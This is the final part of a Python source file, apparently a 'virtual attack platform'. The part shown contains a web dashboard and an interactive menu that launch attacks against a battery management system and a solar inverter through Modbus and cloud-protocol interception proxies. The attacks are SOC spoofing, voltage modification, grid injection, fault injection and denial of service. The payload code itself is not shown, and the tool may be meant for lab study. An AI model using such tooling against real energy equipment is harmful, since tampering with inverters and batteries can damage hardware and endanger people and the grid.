                        v5_count=platform.stats['v5_frames_captured'],
                        attack_count=platform.stats['attacks_executed'],
                        log_content="Platform started. Ready for attacks."
                    )
                    self.wfile.write(html.encode())

                elif self.path == '/stats':
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    stats = {
                        'modbus': platform.stats['modbus_frames_captured'],
                        'v5': platform.stats['v5_frames_captured'],
                        'attacks': platform.stats['attacks_executed']
                    }
                    self.wfile.write(json.dumps(stats).encode())

                elif self.path.startswith('/override'):
                    # Parse reg and val from query
                    parts = self.path.split('?')[1].split('&')
                    reg = int(parts[0].split('=')[1])
                    val = int(parts[1].split('=')[1])

                    if platform.modbus_proxy:
                        platform.modbus_proxy.set_override(reg, val)

                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'OK')

                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                if self.path.startswith('/attack/'):
                    attack = self.path.split('/')[-1]

                    if attack == 'clear':
                        if platform.modbus_proxy:
                            platform.modbus_proxy.clear_overrides()
                    else:
                        platform.execute_attack(attack)

                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'OK')
                else:
                    self.send_response(404)
                    self.end_headers()

        def serve():
            with socketserver.TCPServer(("", self.port), Handler) as httpd:
                self.server = httpd
                logger.info(f"Dashboard running at http://127.0.0.1:{self.port}")
                httpd.serve_forever()

        threading.Thread(target=serve, daemon=True).start()


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================
def main():
    parser = argparse.ArgumentParser(description='Virtual Attack Platform')
    parser.add_argument('--start', action='store_true', help='Start full platform')
    parser.add_argument('--dashboard', action='store_true', help='Enable web dashboard on :8080')
    parser.add_argument('--pcap', default='attack_capture.pcap', help='PCAP output file')
    parser.add_argument('--modbus-port', type=int, default=5021, help='Modbus proxy port')
    parser.add_argument('--v5-port', type=int, default=10001, help='V5 proxy port')
    parser.add_argument('--web-port', type=int, default=8080, help='Dashboard port')

    args = parser.parse_args()

    if not args.start:
        parser.print_help()
        print()
        print("Examples:")
        print("  python virtual_attack_platform.py --start")
        print("  python virtual_attack_platform.py --start --dashboard")
        return

    # Create platform
    platform = AttackPlatform()

    # Start all components
    platform.start(components=['bms', 'inverter', 'modbus_proxy', 'v5_proxy', 'capture'])

    # Start dashboard if requested
    if args.dashboard:
        dashboard = AttackDashboard(platform, port=args.web_port)
        dashboard.start()
        print(f"\n{c('Dashboard: http://127.0.0.1:' + str(args.web_port), Colors.GREEN + Colors.BOLD)}\n")

    # Print instructions
    print(c("═" * 60, Colors.CYAN))
    print(c("  ATTACK PLATFORM READY", Colors.GREEN + Colors.BOLD))
    print(c("═" * 60, Colors.CYAN))
    print()
    print(f"  {c('[1] Open Wireshark:', Colors.YELLOW)} File > Open > {args.pcap}")
    print(f"      Filter: {c('tcp.port == 5021 or tcp.port == 10001', Colors.CYAN)}")
    print()
    print(f"  {c('[2] Configure Inverter to use proxy:', Colors.YELLOW)}")
    print(f"      Change cloud server to: {c('127.0.0.1:' + str(args.v5_port), Colors.CYAN)}")
    print()
    print(f"  {c('[3] Configure Modbus client to use proxy:', Colors.YELLOW)}")
    print(f"      Point inverter at: {c('127.0.0.1:' + str(args.modbus_port), Colors.CYAN)}")
    print()
    print(f"  {c('[4] Watch live events below. Ctrl+C to stop.', Colors.YELLOW)}")
    print()
    print(c("═" * 60, Colors.CYAN))
    print()

    # Interactive attack menu
    try:
        while platform.running:
            print(c("\nAvailable commands:", Colors.YELLOW))
            print("  1. spoof_soc      - SOC spoofing attack")
            print("  2. modify_voltage - Voltage modification")
            print("  3. grid_injection - Grid injection attack")
            print("  4. inject_fault   - Inject fault status")
            print("  5. denial_of_service - DoS attack")
            print("  c. clear          - Clear all overrides")
            print("  s. stats          - Show statistics")
            print("  q. quit           - Stop platform")

            cmd = input(f"\n{c('attack> ', Colors.CYAN + Colors.BOLD)}").strip().lower()

            if cmd == 'q' or cmd == 'quit':
                break
            elif cmd == '1' or cmd == 'spoof_soc':
                platform.execute_attack('spoof_soc')
            elif cmd == '2' or cmd == 'modify_voltage':
                platform.execute_attack('modify_voltage')
            elif cmd == '3' or cmd == 'grid_injection':
                platform.execute_attack('grid_injection')
            elif cmd == '4' or cmd == 'inject_fault':
                platform.execute_attack('inject_fault')
            elif cmd == '5' or cmd == 'denial_of_service':
                platform.execute_attack('denial_of_service')
            elif cmd == 'c' or cmd == 'clear':
                if platform.modbus_proxy:
                    platform.modbus_proxy.clear_overrides()
            elif cmd == 's' or cmd == 'stats':
                platform._print_stats()

    except KeyboardInterrupt:
        pass

    platform.stop()
    print(f"\n{c('Platform stopped. Goodbye!', Colors.CYAN)}")


if __name__ == "__main__":
    main()
